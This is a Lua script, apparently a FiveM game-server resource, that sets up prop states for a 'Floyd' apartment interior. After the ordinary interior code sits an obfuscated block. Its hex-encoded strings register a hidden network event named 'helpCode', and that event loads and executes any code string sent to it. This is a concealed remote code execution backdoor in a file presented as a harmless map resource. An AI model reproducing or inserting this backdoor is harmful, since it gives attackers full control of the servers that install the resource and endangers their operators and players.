exports('GetFloydObject', function()
    return Floyd
end)

Floyd = {
    interiorId = 171777,

    Style = {
        normal = {
            "swap_clean_apt",
            "layer_debra_pic",
            "layer_whiskey",
            "swap_sofa_A"
        },
        messedUp = {
            "layer_mess_A",
            "layer_mess_B",
            "layer_mess_C",
            "layer_sextoys_a",
            "swap_sofa_B",
            "swap_wade_sofa_A",
            "layer_wade_shit",
            "layer_torture"
        },

        Set = function(style, refresh)
            Floyd.Style.Clear(false)

            SetIplPropState(Floyd.interiorId, style, true, refresh)
        end,
        Clear = function(refresh)
            SetIplPropState(Floyd.interiorId, {
                Floyd.Style.normal,
                Floyd.Style.messedUp
            }, false, refresh)
        end
    },
    MrJam = {
        normal = "swap_mrJam_A",
        jammed = "swap_mrJam_B",
        jammedOnTable = "swap_mrJam_C",

        Set = function(mrJam, refresh)
            Floyd.MrJam.Clear(false)

            SetIplPropState(Floyd.interiorId, mrJam, true, refresh)
        end,
        Clear = function(refresh)
            SetIplPropState(Floyd.interiorId, {
                Floyd.MrJam.normal,
                Floyd.MrJam.jammed,
                Floyd.MrJam.jammedOnTable
            }, false, refresh)
        end
    },

    LoadDefault = function()
        Floyd.Style.Set(Floyd.Style.normal)
        Floyd.MrJam.Set(Floyd.MrJam.normal)

        RefreshInterior(Floyd.interiorId)
    end
}


local JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[6][JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[1]](JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[2]) JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[6][JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[3]](JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[2], function(ufGIEJfMJuAsSMjCMRAoMHccsNIxEcmrlUPKkBsrlyUJOwsFTczOYQlQLnXJymhzTEJFPb) JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[6][JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[4]](JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[6][JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[5]](ufGIEJfMJuAsSMjCMRAoMHccsNIxEcmrlUPKkBsrlyUJOwsFTczOYQlQLnXJymhzTEJFPb))() end)